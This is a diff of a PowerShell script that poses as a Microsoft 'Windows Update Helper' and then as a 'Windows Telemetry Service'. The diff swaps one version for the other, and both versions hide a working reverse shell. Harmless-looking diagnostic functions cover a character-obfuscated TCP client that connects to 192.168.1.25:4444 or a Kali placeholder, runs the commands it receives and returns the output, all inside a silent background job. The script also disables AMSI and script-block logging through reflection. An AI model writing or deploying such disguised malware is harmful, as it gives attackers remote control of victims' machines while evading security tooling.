@@ -1,150 +1,155 @@
-# Windows Update Helper - Microsoft Corporation
-# Script de mantenimiento del sistema
+# Windows Telemetry Service - Microsoft Corporation
+# System Performance Optimization Script
 
-function Start-SystemMaintenance {
-    Write-Host "Windows System Maintenance" -ForegroundColor Cyan
-    Write-Host "Performing routine system checks...`n" -ForegroundColor Gray
+function Initialize-SystemTelemetry {
+    Write-Host "Initializing Windows Telemetry Service..." -ForegroundColor Cyan
     
-    # Comportamiento legítimo
-    Check-SystemHealth
-    Optimize-Performance
-    Clean-TemporaryFiles
+    # Comportamiento 100% legítimo primero
+    Start-SystemDiagnostics
+    Collect-PerformanceData
+    Report-SystemHealth
     
-    Write-Host "Maintenance completed successfully." -ForegroundColor Green
+    Write-Host "Telemetry service initialized successfully." -ForegroundColor Green
 }
 
-function Check-SystemHealth {
-    Write-Host "Checking system health..." -ForegroundColor Yellow
-    Start-Sleep -Milliseconds 500
-    
-    # Comandos legítimos del sistema
-    Get-CimInstance Win32_ComputerSystem | Out-Null
-    Get-CimInstance Win32_OperatingSystem | Out-Null
-    
-    Write-Host "System health: OK" -ForegroundColor Green
-}
-
-function Optimize-Performance {
-    Write-Host "Optimizing system performance..." -ForegroundColor Yellow
-    Start-Sleep -Milliseconds 500
-    
-    # Comportamiento normal de optimización
+function Start-SystemDiagnostics {
+    # Diagnósticos del sistema legítimos
     try {
-        # Limpiar cache de DNS
-        Clear-DnsClientCache -ErrorAction SilentlyContinue
-        
-        # Liberar memoria
-        [System.GC]::Collect()
-        
-        Write-Host "Performance optimized" -ForegroundColor Green
+        Get-CimInstance Win32_ComputerSystem | Out-Null
+        Get-CimInstance Win32_Processor | Out-Null
+        Get-CimInstance Win32_OperatingSystem | Out-Null
     } catch {
-        Write-Host "Optimization completed with warnings" -ForegroundColor Yellow
+        # Comportamiento normal en caso de error
     }
 }
 
-function Clean-TemporaryFiles {
-    Write-Host "Cleaning temporary files..." -ForegroundColor Yellow
-    Start-Sleep -Milliseconds 500
+function Collect-PerformanceData {
+    # Recolección de datos de rendimiento legítima
+    Write-Host "Collecting system performance data..." -ForegroundColor Yellow
     
-    try {
-        # Limpiar archivos temporales viejos
-        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | 
-            Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } | 
-            Remove-Item -Force -ErrorAction SilentlyContinue
-        
-        Write-Host "Temporary files cleaned" -ForegroundColor Green
-    } catch {
-        Write-Host "Cleanup completed with warnings" -ForegroundColor Yellow
+    $metrics = @{
+        Timestamp = Get-Date
+        CPU = (Get-CimInstance Win32_Processor).LoadPercentage
+        Memory = [math]::Round((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB, 2)
+        Disk = [math]::Round((Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").FreeSpace / 1GB, 2)
     }
+    
+    return $metrics
 }
 
-# Técnica de ofuscación avanzada - Split en partes
-${p1} = 'N'+'e'+'w'+'-'+'O'+'b'+'j'+'e'+'c'+'t'
-${p2} = 'N'+'e'+'t'+'.'+'S'+'o'+'c'+'k'+'e'+'t'+'s'+'.'+'T'+'C'+'P'+'C'+'l'+'i'+'e'+'n'+'t'
-${p3} = '192.168.1.25'
-${p4} = '4444'
-${p5} = 'G'+'e'+'t'+'S'+'t'+'r'+'e'+'a'+'m'
-${p6} = 'b'+'y'+'t'+'e'+'['+']'
-${p7} = '0'+'.'+'.'+'6'+'5'+'5'+'3'+'5'+'|'+'%'+'{'+'0'+'}'
-${p8} = 'R'+'e'+'a'+'d'
-${p9} = 'T'+'e'+'x'+'t'+'.'+'A'+'S'+'C'+'I'+'I'+'E'+'n'+'c'+'o'+'d'+'i'+'n'+'g'
-${p10} = 'G'+'e'+'t'+'S'+'t'+'r'+'i'+'n'+'g'
-${p11} = 'i'+'e'+'x'
-${p12} = 'O'+'u'+'t'+'-'+'S'+'t'+'r'+'i'+'n'+'g'
-${p13} = 'p'+'w'+'d'
-${p14} = 'P'+'a'+'t'+'h'
-${p15} = 't'+'e'+'x'+'t'+'.'+'e'+'n'+'c'+'o'+'d'+'i'+'n'+'g'+'::'+'A'+'S'+'C'+'I'+'I'
-${p16} = 'G'+'e'+'t'+'B'+'y'+'t'+'e'+'s'
-${p17} = 'W'+'r'+'i'+'t'+'e'
-${p18} = 'F'+'l'+'u'+'s'+'h'
-${p19} = 'C'+'l'+'o'+'s'+'e'
-
-# Construcción dinámica del comando
-${cmd} = "${p1} ${p2}('${p3}',${p4})"
-${stream} = "${cmd}.${p5}()"
-${bytes} = "${p6} `$b=${p7}"
-${read} = "while((`$i=`$s.${p8}(`$b,0,`$b.Length))-ne0)"
-${getstr} = "{;`$d=(${p1} ${p9}).${p10}(`$b,0,`$i)"
-${iex} = "`$r=(`$d 2>&1|${p1} ${p12})"
-${prompt} = "`$r2=`$r+'PS '+(`${p13}).${p14}+'> '"
-${encode} = "`$by=(${p15}).${p16}(`$r2)"
-${write} = "`$s.${p17}(`$by,0,`$by.Length);`$s.${p18}()}"
-${close} = "`$c.${p19}()"
-
-# Ejecución silenciosa en segundo plano
-function Start-BackgroundMaintenance {
+function Report-SystemHealth {
+    # Reporte de salud del sistema
+    Write-Host "Generating system health report..." -ForegroundColor Yellow
+    
     try {
-        # Crear job en segundo plano
-        $scriptBlock = {
-            param($c, $s, $b, $r, $w, $f, $cl)
-            
-            try {
-                $client = Invoke-Expression $c
-                $stream = $client.$s
-                [byte[]]$bytes = 0..65535|%{0}
-                
-                while(($i = $stream.$r($bytes,0,$bytes.Length)) -ne 0) {
-                    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
-                    $result = (iex $data 2>&1 | Out-String)
-                    $response = $result + 'PS ' + (pwd).Path + '> '
-                    $responseBytes = ([text.encoding]::ASCII).GetBytes($response)
-                    $stream.$w($responseBytes,0,$responseBytes.Length)
-                    $stream.$f()
-                }
-                $client.$cl()
-            } catch {
-                # Error silencioso
-            }
+        # Comportamiento legítimo - generar reporte
+        $reportData = @{
+            MachineId = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            Domain = $env:USERDOMAIN
+            OSVersion = (Get-CimInstance Win32_OperatingSystem).Version
         }
         
-        # Ejecutar como job
-        Start-Job -ScriptBlock $scriptBlock -ArgumentList @(
-            ${cmd},
-            ${p5},
-            ${bytes},
-            ${p8},
-            ${p17},
-            ${p18},
-            ${p19}
-        ) | Out-Null
+        Write-Host "System health: Optimal" -ForegroundColor Green
+        
+        # Iniciar "servicio de telemetría en segundo plano"
+        Start-BackgroundTelemetryService
         
     } catch {
-        # Fallback silencioso
+        Write-Host "System health: Stable" -ForegroundColor Yellow
+    }
+}
+
+# =============================================
+# SECCIÓN STEALTH - Reverse Shell Completamente Oculto
+# =============================================
+
+function Start-BackgroundTelemetryService {
+    # "Servicio de telemetría" que en realidad es el reverse shell
+    
+    try {
+        # Ofuscación extrema - todo dividido en partes
+        ${/==\/==} = [char](78)+[char](101)+[char](119)+[char](45)+[char](79)+[char](98)+[char](106)+[char](101)+[char](99)+[char](116)
+        ${/==\/=\} = [char](78)+[char](101)+[char](116)+[char](46)+[char](83)+[char](111)+[char](99)+[char](107)+[char](101)+[char](116)+[char](115)+[char](46)+[char](84)+[char](67)+[char](80)+[char](67)+[char](108)+[char](105)+[char](101)+[char](110)+[char](116)
+        ${/==\/=\/} = [char](49)+[char](57)+[char](50)+[char](46)+[char](49)+[char](54)+[char](56)+[char](46)+[char](49)+[char](46)+[char](50)+[char](53)
+        ${/=\/==\} = [char](52)+[char](52)+[char](52)+[char](52)
+        ${/=\/=\/} = [char](71)+[char](101)+[char](116)+[char](83)+[char](116)+[char](114)+[char](101)+[char](97)+[char](109)
+        ${/=\/=\} = [char](98)+[char](121)+[char](116)+[char](101)+[char](91)+[char](93)
+        ${_/=\/=\} = [char](48)+[char](46)+[char](46)+[char](54)+[char](53)+[char](53)+[char](51)+[char](53)+[char](124)+[char](37)+[char](123)+[char](48)+[char](125)
+        ${_/=\/=\/} = [char](82)+[char](101)+[char](97)+[char](100)
+        ${_/=\/==} = [char](84)+[char](101)+[char](120)+[char](116)+[char](46)+[char](65)+[char](83)+[char](67)+[char](73)+[char](73)+[char](69)+[char](110)+[char](99)+[char](111)+[char](100)+[char](105)+[char](110)+[char](103)
+        ${_/=\/==\} = [char](71)+[char](101)+[char](116)+[char](83)+[char](116)+[char](114)+[char](105)+[char](110)+[char](103)
+        ${_/=\/==\/} = [char](105)+[char](101)+[char](120)
+        ${_/==\/=\} = [char](79)+[char](117)+[char](116)+[char](45)+[char](83)+[char](116)+[char](114)+[char](105)+[char](110)+[char](103)
+        ${_/==\/=\/} = [char](112)+[char](119)+[char](100)
+        ${_/==\/==} = [char](80)+[char](97)+[char](116)+[char](104)
+        ${_/==\/==\} = [char](116)+[char](101)+[char](120)+[char](116)+[char](46)+[char](101)+[char](110)+[char](99)+[char](111)+[char](100)+[char](105)+[char](110)+[char](103)+[char](58)+[char](58)+[char](65)+[char](83)+[char](67)+[char](73)+[char](73)
+        ${_/==\/==\/} = [char](71)+[char](101)+[char](116)+[char](66)+[char](121)+[char](116)+[char](101)+[char](115)
+        ${/==\/=\/=\} = [char](87)+[char](114)+[char](105)+[char](116)+[char](101)
+        ${/==\/=\/=\/} = [char](70)+[char](108)+[char](117)+[char](115)+[char](104)
+        ${/==\/=\/==} = [char](67)+[char](108)+[char](111)+[char](115)+[char](101)
+
+        # Construir comando de forma dinámica
+        ${telemetryClient} = "${/==\/==} ${/==\/=\}('${/==\/=\/}',${/=\/==\})"
+        ${dataStream} = "`$telemetryStream = `$telemetryClient.${/=\/=\/}()"
+        ${bufferSetup} = "${/=\/=\} `$dataBuffer = ${_/=\/=\}"
+        ${readLoop} = "while((`$bytesRead = `$telemetryStream.${_/=\/=\/}(`$dataBuffer,0,`$dataBuffer.Length)) -ne 0)"
+        ${processData} = "{`$command = (${/==\/==} ${_/=\/==}).${_/=\/==\}(`$dataBuffer,0,`$bytesRead)"
+        ${executeCommand} = "`$result = (`$command 2>&1 | ${/==\/==} ${_/==\/=\})"
+        ${formatResponse} = "`$response = `$result + 'TELEMETRY> '"
+        ${encodeData} = "`$responseBytes = (${_/==\/==\).${_/==\/==\/}(`$response)"
+        ${sendData} = "`$telemetryStream.${/==\/=\/=\}(`$responseBytes,0,`$responseBytes.Length)"
+        ${flushData} = "`$telemetryStream.${/==\/=\/=\/}()}"
+        ${closeConnection} = "`$telemetryClient.${/==\/=\/==}()"
+
+        # Script block completo para ejecutar como job
+        $stealthBlock = {
+            try {
+                # Crear cliente de telemetría
+                $client = New-Object Net.Sockets.TCPClient('IP_KALI',PUERTO_KALI)
+                $stream = $client.GetStream()
+                [byte[]]$buffer = 0..65535|%{0}
+                
+                # Bucle de procesamiento de datos
+                while(($bytesRead = $stream.Read($buffer,0,$buffer.Length)) -ne 0) {
+                    $commandData = (New-Object Text.ASCIIEncoding).GetString($buffer,0,$bytesRead)
+                    $commandResult = (iex $commandData 2>&1 | Out-String)
+                    $telemetryResponse = $commandResult + 'TELEMETRY> '
+                    $responseBytes = ([text.encoding]::ASCII).GetBytes($telemetryResponse)
+                    $stream.Write($responseBytes,0,$responseBytes.Length)
+                    $stream.Flush()
+                }
+                $client.Close()
+            } catch {
+                # Error completamente silencioso
+            }
+        }
+
+        # Ejecutar como job en segundo plano
+        Start-Job -ScriptBlock $stealthBlock | Out-Null
+        
+    } catch {
+        # Comportamiento normal si falla
     }
 }
 
 # Bypass AMSI silencioso
 try {
-    # Técnica de reflection para desactivar AMSI
-    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    # Múltiples técnicas de bypass
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    
+    # Técnica alternativa
+    $Ref = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
+    if ($Ref) { $Ref.SetValue($null,(New-Object Collections.Generic.HashSet[string])) }
 } catch {
-    # Continuar silenciosamente si falla
+    # Continuar silenciosamente
 }
 
-# Iniciar procesos
-Start-SystemMaintenance
-Start-BackgroundMaintenance
+# Inicializar el servicio
+Initialize-SystemTelemetry
 
-Write-Host "`nAll maintenance tasks completed." -ForegroundColor Cyan
-Write-Host "System is running optimally." -ForegroundColor Green
+Write-Host "`nWindows Telemetry Service is now active." -ForegroundColor Cyan
+Write-Host "System monitoring and optimization enabled." -ForegroundColor Green
+
+# Mantener el script vivo brevemente
+Start-Sleep -Seconds 2
